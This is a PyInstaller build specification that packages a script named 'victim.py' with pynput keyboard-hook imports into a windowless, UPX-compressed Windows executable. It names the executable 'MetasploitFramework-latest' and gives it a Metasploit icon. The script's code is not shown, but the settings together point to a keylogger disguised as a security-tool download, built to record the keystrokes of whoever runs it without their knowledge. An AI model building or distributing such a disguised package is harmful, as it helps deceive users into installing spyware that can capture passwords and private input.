# -*- mode: python ; coding: utf-8 -*-

a = Analysis(
    ['victim.py'],
    pathex=[],
    binaries=[],
    datas=[],
    hiddenimports=[
        'pynput',
        'pynput.keyboard',
        'pynput._util',
        'pynput._util.win32',
        'pynput._util.win32_vks',
    ],
    hookspath=[],
    hooksconfig={},
    runtime_hooks=[],
    excludes=[],
    noarchive=False,
)
pyz = PYZ(a.pure)

exe = EXE(
    pyz,
    a.scripts,
    a.binaries,
    a.datas,
    [],
    name='MetasploitFramework-latest',
    debug=False,
    bootloader_ignore_signals=False,
    strip=False,
    upx=True,
    upx_exclude=[],
    runtime_tmpdir=None,
    console=False,
    disable_windowed_traceback=False,
    argv_emulation=False,
    target_arch=None,
    codesign_identity=None,
    entitlements_file=None,
    icon='metasploit.ico',
)
